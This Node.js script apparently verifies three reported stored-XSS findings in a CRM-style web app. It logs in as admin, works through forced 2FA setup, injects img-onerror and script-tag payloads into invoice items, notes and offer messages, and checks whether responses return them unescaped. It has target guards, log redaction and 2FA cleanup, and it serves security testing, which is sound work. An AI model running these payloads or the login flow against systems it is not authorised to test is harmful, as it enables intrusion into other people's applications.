import http from 'http';
import https from 'https';
import crypto from 'crypto';
import { URL } from 'url';

const BASE = (process.env.BASE_URL || '').trim().replace(/\/$/, '');
const ADMIN_EMAIL = (process.env.ADMIN_EMAIL || '').trim();
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '';
const PORTAL_TEST_PASSWORD = `Portal-Aa1!${crypto.randomBytes(18).toString('base64url')}`;
let temporaryTotpSecret = null;

function assertSecurityTestTarget() {
  if (!BASE || !ADMIN_EMAIL || !ADMIN_PASSWORD) {
    throw new Error('BASE_URL, ADMIN_EMAIL, and ADMIN_PASSWORD are required');
  }
  let target;
  try {
    target = new URL(BASE);
  } catch {
    throw new Error('BASE_URL must be an absolute http(s) origin');
  }
  const localHostnames = new Set(['localhost', '127.0.0.1', '::1', '[::1]']);
  if (!['http:', 'https:'].includes(target.protocol) || target.username || target.password || target.pathname !== '/' || target.search || target.hash) {
    throw new Error('BASE_URL must be an http(s) origin without credentials, path, query, or fragment');
  }
  if (localHostnames.has(target.hostname) && process.env.NODE_ENV === 'production') {
    throw new Error('Local XSS test targets are blocked when NODE_ENV=production');
  }
  if (!localHostnames.has(target.hostname)) {
    if (target.protocol !== 'https:') throw new Error('Remote XSS test targets must use HTTPS');
    if (process.env.CONFIRM_REMOTE_XSS_TEST !== target.hostname) {
      throw new Error(`Set CONFIRM_REMOTE_XSS_TEST=${target.hostname} to target this remote host`);
    }
  }
}

// ---- TOTP implementation (pure Node crypto, no deps) ----
function base32Decode(s) {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  s = s.toUpperCase().replace(/=+$/, '');
  let bits = 0, value = 0;
  const output = [];
  for (const c of s) {
    value = (value << 5) | alphabet.indexOf(c);
    bits += 5;
    if (bits >= 8) {
      output.push((value >>> (bits - 8)) & 255);
      bits -= 8;
    }
  }
  return Buffer.from(output);
}

function generateTOTP(secret, period = 30, digits = 6) {
  const counter = Math.floor(Date.now() / 1000 / period);
  const buf = Buffer.alloc(8);
  buf.writeUInt32BE(Math.floor(counter / 0x100000000), 0);
  buf.writeUInt32BE(counter >>> 0, 4);
  const key = base32Decode(secret);
  const hmac = crypto.createHmac('sha1', key).update(buf).digest();
  const offset = hmac[hmac.length - 1] & 0xf;
  const code = (((hmac[offset] & 0x7f) << 24) | (hmac[offset + 1] << 16) | (hmac[offset + 2] << 8) | hmac[offset + 3]) % Math.pow(10, digits);
  return String(code).padStart(digits, '0');
}

// ---- HTTP helper ----
function request(method, urlStr, { headers = {}, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const options = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname + url.search,
      method,
      headers: { ...headers },
    };
    if (body) {
      const bodyBuf = Buffer.isBuffer(body) ? body : Buffer.from(body);
      options.headers['Content-Length'] = bodyBuf.length;
    }
    const transport = url.protocol === 'https:' ? https : http;
    const req = transport.request(options, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({
        status: res.statusCode,
        headers: res.headers,
        body: Buffer.concat(chunks).toString(),
      }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

// ---- Cookie jar ----
let cookieJar = {};

function setCookiesFromHeader(setCookieHeader) {
  if (!setCookieHeader) return;
  const cookies = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
  for (const cookie of cookies) {
    const [nameVal] = cookie.split(';');
    const [name, ...valParts] = nameVal.split('=');
    cookieJar[name.trim()] = valParts.join('=').trim();
  }
}

function getCookieHeader() {
  return Object.entries(cookieJar).map(([k, v]) => `${k}=${v}`).join('; ');
}

function authHeaders(extra = {}) {
  return { Cookie: getCookieHeader(), ...extra };
}

const SENSITIVE_KEY = /password|secret|token|cookie|authorization|otp|session/iu;
function redactSensitive(value, key = '') {
  if (SENSITIVE_KEY.test(key)) return '[REDACTED]';
  if (Array.isArray(value)) return value.map((item) => redactSensitive(item));
  if (value && typeof value === 'object') {
    return Object.fromEntries(Object.entries(value).map(([name, item]) => [name, redactSensitive(item, name)]));
  }
  if (typeof value !== 'string') return value;
  return value.replace(/((?:password|secret|csrfToken|totp|session(?:-token)?|authorization|cookie)\s*["']?\s*[:=]\s*["']?)[^"',&;\s}]+/giu, '$1[REDACTED]');
}

function log(label, status, body) {
  console.log(`\n${'='.repeat(60)}`);
  console.log(`[${label}] Status: ${status}`);
  try {
    const parsed = JSON.parse(body);
    console.log('Body (JSON):', JSON.stringify(redactSensitive(parsed), null, 2));
  } catch {
    const preview = body.length > 3000 ? body.substring(0, 3000) + '\n...[truncated]' : body;
    console.log('Body (raw):', redactSensitive(preview));
  }
}

// ---- Authentication with 2FA setup bypass ----
async function authenticate() {
  console.log('\n===== AUTHENTICATION =====');

  // Step 1: Get CSRF token
  const csrfRes = await request('GET', `${BASE}/api/auth/csrf`);
  setCookiesFromHeader(csrfRes.headers['set-cookie']);
  const csrfData = JSON.parse(csrfRes.body);
  const csrfToken = csrfData.csrfToken;
  console.log('CSRF token acquired:', Boolean(csrfToken));

  // Step 2: Login (will set needsSetup2fa=true in JWT)
  const formBody = new URLSearchParams({
    csrfToken,
    email: ADMIN_EMAIL,
    password: ADMIN_PASSWORD,
    redirect: 'false',
    json: 'true',
  }).toString();

  const loginRes = await request('POST', `${BASE}/api/auth/callback/credentials`, {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: getCookieHeader(),
    },
    body: formBody,
  });
  setCookiesFromHeader(loginRes.headers['set-cookie']);
  log('AUTH LOGIN', loginRes.status, loginRes.body);

  // Step 3: Initiate 2FA setup (allowed even with needsSetup2fa)
  console.log('\n--- Setting up 2FA to clear needsSetup2fa ---');
  const setupRes = await request('POST', `${BASE}/api/v1/auth/2fa`, {
    headers: {
      'Content-Type': 'application/json',
      Cookie: getCookieHeader(),
    },
    body: JSON.stringify({ action: 'setup' }),
  });
  log('2FA SETUP', setupRes.status, setupRes.body);

  let totpSecret = null;
  try {
    const setupData = JSON.parse(setupRes.body);
    totpSecret = setupData.data?.secret;
    temporaryTotpSecret = totpSecret;
    console.log('TOTP secret acquired:', Boolean(totpSecret));
  } catch (e) {
    console.log('Could not parse setup response:', e.message);
    return false;
  }

  if (!totpSecret) {
    console.log('ERROR: No TOTP secret received');
    return false;
  }

  // Step 4: Generate TOTP code and verify (enables 2FA)
  const totpCode = generateTOTP(totpSecret);
  console.log('Generated TOTP code: [REDACTED]');

  const verifyRes = await request('POST', `${BASE}/api/v1/auth/2fa`, {
    headers: {
      'Content-Type': 'application/json',
      Cookie: getCookieHeader(),
    },
    body: JSON.stringify({ action: 'verify', code: totpCode }),
  });
  log('2FA VERIFY (enable)', verifyRes.status, verifyRes.body);

  try {
    const vData = JSON.parse(verifyRes.body);
    if (!vData.success) {
      console.log('ERROR: 2FA verification failed');
      return false;
    }
  } catch (e) {
    console.log('Could not parse verify response:', e.message);
    return false;
  }

  // Step 5: Re-authenticate with TOTP code (now needs2fa=true, so provide code)
  // Reset cookies and re-login
  cookieJar = {};
  const csrfRes2 = await request('GET', `${BASE}/api/auth/csrf`);
  setCookiesFromHeader(csrfRes2.headers['set-cookie']);
  const csrfToken2 = JSON.parse(csrfRes2.body).csrfToken;

  // Generate fresh TOTP code
  const totpCode2 = generateTOTP(totpSecret);
  console.log('Re-login TOTP code: [REDACTED]');

  const formBody2 = new URLSearchParams({
    csrfToken: csrfToken2,
    email: ADMIN_EMAIL,
    password: ADMIN_PASSWORD,
    totpCode: totpCode2,
    redirect: 'false',
    json: 'true',
  }).toString();

  const loginRes2 = await request('POST', `${BASE}/api/auth/callback/credentials`, {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: getCookieHeader(),
    },
    body: formBody2,
  });
  setCookiesFromHeader(loginRes2.headers['set-cookie']);
  log('AUTH RE-LOGIN (with TOTP)', loginRes2.status, loginRes2.body);

  // Step 6: Verify session
  const sessionRes = await request('GET', `${BASE}/api/auth/session`, {
    headers: { Cookie: getCookieHeader() },
  });
  log('AUTH SESSION', sessionRes.status, sessionRes.body);

  try {
    const sessionData = JSON.parse(sessionRes.body);
    if (!sessionData.user) {
      console.log('ERROR: No session user found');
      return false;
    }
    console.log('Logged in as:', sessionData.user.email, '| role:', sessionData.user.role);
    console.log('needs2fa:', sessionData.user.needs2fa, '| needsSetup2fa:', sessionData.user.needsSetup2fa);

    if (sessionData.user.needs2fa) {
      // Need to go through verify-2fa flow
      console.log('\n--- User needs 2FA verification via /login/verify-2fa ---');
      const totpCode3 = generateTOTP(totpSecret);
      const verifyLoginRes = await request('POST', `${BASE}/api/v1/auth/verify-2fa`, {
        headers: {
          'Content-Type': 'application/json',
          Cookie: getCookieHeader(),
        },
        body: JSON.stringify({ code: totpCode3 }),
      });
      log('VERIFY-2FA LOGIN', verifyLoginRes.status, verifyLoginRes.body);
    }
  } catch (e) {
    console.log('Session parse error:', e.message);
  }

  // Step 7: Now disable 2FA so future test runs don't need it
  // (do this at the end)

  return totpSecret;
}

async function test1_PortalKB() {
  console.log('\n\n===== TEST 1: XSS-VULN-02 - Portal KB Public Endpoint =====');

  // 4. Check existing KB article via public endpoint
  const kbId = 'cmn9fu72h001jtdcpw5b8m5vi';
  const publicKbRes = await request('GET', `${BASE}/api/v1/public/portal-kb?id=${kbId}`);
  log('PUBLIC PORTAL-KB (specific ID)', publicKbRes.status, publicKbRes.body);

  // 5. Get list of KB articles (with auth)
  const kbListRes = await request('GET', `${BASE}/api/v1/kb`, {
    headers: authHeaders(),
  });
  log('KB LIST (auth)', kbListRes.status, kbListRes.body);

  // Also try portal-kb without id (list)
  const publicKbListRes = await request('GET', `${BASE}/api/v1/public/portal-kb`);
  log('PUBLIC PORTAL-KB (list, no auth)', publicKbListRes.status, publicKbListRes.body);

  // 6. Try to register portal customer for different org slugs
  const orgSlugs = ['xuven-technology', 'leaddrive', 'leaddrive-inc'];
  for (const slug of orgSlugs) {
    const regRes = await request('POST', `${BASE}/api/v1/public/portal-auth/register`, {
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'portal_test_xss@mailtest.com',
        password: PORTAL_TEST_PASSWORD,
        name: 'Portal Test',
        organizationSlug: slug,
      }),
    });
    log(`PORTAL REGISTER (slug: ${slug})`, regRes.status, regRes.body);
    if (regRes.status < 400) break;
  }

  // Try to get portal kb with published article from KB list
  try {
    const kbData = JSON.parse(kbListRes.body);
    const articles = Array.isArray(kbData) ? kbData : (kbData.articles || kbData.data || []);
    if (articles.length > 0) {
      for (const article of articles.slice(0, 5)) {
        const artId = article.id;
        console.log(`\nChecking KB article ID: ${artId}, status: ${article.status}`);
        const pubRes = await request('GET', `${BASE}/api/v1/public/portal-kb?id=${artId}`);
        log(`PUBLIC PORTAL-KB (id: ${artId})`, pubRes.status, pubRes.body);
        if (pubRes.status === 200) {
          const content = pubRes.body;
          const hasXss = content.includes('<script>') || content.includes('onerror=') || content.includes('XSS');
          console.log(`XSS payload present in response: ${hasXss}`);
          if (hasXss) {
            console.log('!!! XSS-VULN-02 CONFIRMED: Unescaped XSS payload in portal KB response !!!');
          }
        }
      }
    }
  } catch (e) {
    console.log('Could not process KB list:', e.message);
  }
}

async function test2_InvoiceXSS() {
  console.log('\n\n===== TEST 2: XSS-VULN-07 - Invoice Item Description XSS =====');

  // 7. Create invoice with malicious item description
  const invoicePayload = {
    title: 'XSS Test Invoice',
    clientName: 'Test Client',
    clientEmail: 'test@example.com',
    issueDate: '2026-03-27',
    dueDate: '2026-04-27',
    items: [
      {
        name: "<img src=x onerror=document.title='XSS07-ITEM'>",
        description: "<script>document.title='XSS07-DESC'</script>Test Description",
        quantity: 1,
        price: 100,
        total: 100,
      },
    ],
    notes: "<img src=x onerror=document.title='XSS07-NOTES'>",
    status: 'draft',
  };

  const createRes = await request('POST', `${BASE}/api/v1/invoices`, {
    headers: authHeaders({ 'Content-Type': 'application/json' }),
    body: JSON.stringify(invoicePayload),
  });
  log('CREATE INVOICE (XSS payload)', createRes.status, createRes.body);

  let invoiceId = null;
  try {
    const data = JSON.parse(createRes.body);
    invoiceId = data.id || data.invoice?.id;
    console.log('Invoice ID:', invoiceId);
  } catch (e) {
    console.log('Could not parse invoice response:', e.message);
  }

  if (!invoiceId) {
    // Try to find it from list
    const listRes = await request('GET', `${BASE}/api/v1/invoices`, {
      headers: authHeaders(),
    });
    log('INVOICE LIST', listRes.status, listRes.body);
    try {
      const listData = JSON.parse(listRes.body);
      const invoices = Array.isArray(listData) ? listData : (listData.invoices || listData.data || []);
      // Find the XSS test invoice
      const xssInvoice = invoices.find(i => i.title === 'XSS Test Invoice') || invoices[0];
      if (xssInvoice) {
        invoiceId = xssInvoice.id;
        console.log('Using invoice ID:', invoiceId);
      }
    } catch (e) {
      console.log('Could not parse invoice list:', e.message);
    }
  }

  if (invoiceId) {
    // 8. GET invoice ACT page - check for unescaped HTML
    const actRes = await request('GET', `${BASE}/api/v1/invoices/${invoiceId}/act`, {
      headers: authHeaders(),
    });
    log(`INVOICE ACT (id: ${invoiceId})`, actRes.status, actRes.body);

    // Check for XSS payloads
    const actBody = actRes.body;
    const xssPatterns = [
      { pattern: "<img src=x onerror=document.title='XSS07-ITEM'>", label: 'item name (img onerror)' },
      { pattern: "<script>document.title='XSS07-DESC'</script>", label: 'description (script tag)' },
      { pattern: "<img src=x onerror=document.title='XSS07-NOTES'>", label: 'notes (img onerror)' },
      { pattern: 'onerror=', label: 'any onerror attribute' },
      { pattern: '<script>', label: 'any script tag' },
    ];
    console.log('\n--- XSS Payload Analysis in /act Response ---');
    for (const { pattern, label } of xssPatterns) {
      const found = actBody.includes(pattern);
      console.log(`[${label}]: ${found ? '!!! FOUND - VULNERABLE !!!' : 'not found (escaped/filtered)'}`);
    }

    // Show context around any found payloads
    if (actBody.includes('onerror') || actBody.includes('<script>')) {
      const idx = actBody.indexOf('onerror');
      if (idx > -1) {
        console.log('\nContext around onerror:', actBody.substring(Math.max(0, idx - 100), idx + 200));
      }
    }

    // 9. GET invoice PDF
    const pdfRes = await request('GET', `${BASE}/api/v1/invoices/${invoiceId}/pdf`, {
      headers: authHeaders(),
    });
    log(`INVOICE PDF (id: ${invoiceId}) - first 500 chars`, pdfRes.status, pdfRes.body.substring(0, 500));
  }
}

async function test3_OfferSendXSS() {
  console.log('\n\n===== TEST 3: XSS-VULN-08 - Offer Send Message XSS =====');

  // 10. Get existing offers
  const offersRes = await request('GET', `${BASE}/api/v1/offers`, {
    headers: authHeaders(),
  });
  log('OFFERS LIST', offersRes.status, offersRes.body);

  let offerId = null;
  try {
    const offersData = JSON.parse(offersRes.body);
    const offers = Array.isArray(offersData) ? offersData : (offersData.offers || offersData.data || []);
    if (offers.length > 0) {
      offerId = offers[0].id;
      console.log('Using offer ID:', offerId, '| title:', offers[0].title);
    }
  } catch (e) {
    console.log('Could not parse offers response:', e.message);
  }

  if (!offerId) {
    // Create an offer first
    console.log('No offers found, creating one...');
    const createOfferRes = await request('POST', `${BASE}/api/v1/offers`, {
      headers: authHeaders({ 'Content-Type': 'application/json' }),
      body: JSON.stringify({
        title: 'XSS Test Offer',
        clientName: 'Test Client',
        clientEmail: 'test@example.com',
        status: 'draft',
        items: [{ name: 'Test Item', description: 'Test', quantity: 1, price: 100, total: 100 }],
      }),
    });
    log('CREATE OFFER', createOfferRes.status, createOfferRes.body);
    try {
      const data = JSON.parse(createOfferRes.body);
      offerId = data.id || data.offer?.id;
      console.log('Created offer ID:', offerId);
    } catch (e) {
      console.log('Could not parse create offer response:', e.message);
    }
  }

  if (offerId) {
    // 11. Send offer with XSS message
    const sendPayload = {
      message: "</p><img src=x onerror=\"document.title='XSS08-OFFER'\"><p>",
      recipientEmail: 'test@example.com',
    };

    const sendRes = await request('POST', `${BASE}/api/v1/offers/${offerId}/send`, {
      headers: authHeaders({ 'Content-Type': 'application/json' }),
      body: JSON.stringify(sendPayload),
    });
    log(`OFFER SEND (id: ${offerId})`, sendRes.status, sendRes.body);
  }

  // 12. Check email logs
  const emailLogRes = await request('GET', `${BASE}/api/v1/email-log`, {
    headers: authHeaders(),
  });
  log('EMAIL LOG', emailLogRes.status, emailLogRes.body);

  // Find latest entry and check for XSS payload
  try {
    const logData = JSON.parse(emailLogRes.body);
    const logs = Array.isArray(logData) ? logData : (logData.logs || logData.data || logData.emailLogs || []);
    if (logs.length > 0) {
      const latest = logs[0];
      console.log('\n--- Latest email log entry ---');
      console.log(JSON.stringify(latest, null, 2));

      const logStr = JSON.stringify(latest);
      const xssPayloads = [
        { pattern: "XSS08-OFFER", label: 'XSS08-OFFER marker' },
        { pattern: 'onerror=', label: 'onerror attribute' },
        { pattern: '<img src=x', label: 'img src=x payload' },
        { pattern: '</p><img', label: 'closing p + img tag' },
      ];
      console.log('\n--- XSS Payload Analysis in Email Log ---');
      for (const { pattern, label } of xssPayloads) {
        const found = logStr.includes(pattern);
        console.log(`[${label}]: ${found ? '!!! FOUND - VULNERABLE !!!' : 'not found'}`);
      }
    }
  } catch (e) {
    console.log('Could not parse email log response:', e.message);
  }
}

async function disableTwoFA(totpSecret) {
  if (!totpSecret) return;
  console.log('\n--- Disabling 2FA to restore original state ---');
  const code = generateTOTP(totpSecret);
  const disableRes = await request('POST', `${BASE}/api/v1/auth/2fa`, {
    headers: authHeaders({ 'Content-Type': 'application/json' }),
    body: JSON.stringify({ action: 'disable', code }),
  });
  log('DISABLE 2FA', disableRes.status, disableRes.body);
  if (disableRes.status < 200 || disableRes.status >= 300) {
    throw new Error(`2FA cleanup failed with HTTP ${disableRes.status}`);
  }
}

// ---- Main ----
(async () => {
  let totpSecret = null;
  try {
    assertSecurityTestTarget();
    totpSecret = await authenticate();
    if (!totpSecret) throw new Error('Authentication or temporary 2FA setup failed');
    await test1_PortalKB();
    await test2_InvoiceXSS();
    await test3_OfferSendXSS();
    console.log('\n\n===== ALL TESTS COMPLETE =====');
  } catch (err) {
    console.error('Fatal error:', err);
    process.exitCode = 1;
  } finally {
    const cleanupSecret = totpSecret || temporaryTotpSecret;
    if (cleanupSecret) {
      await disableTwoFA(cleanupSecret).catch((error) => {
        console.error('Failed to restore 2FA state:', error.message);
        process.exitCode = 1;
      });
    }
  }
})();
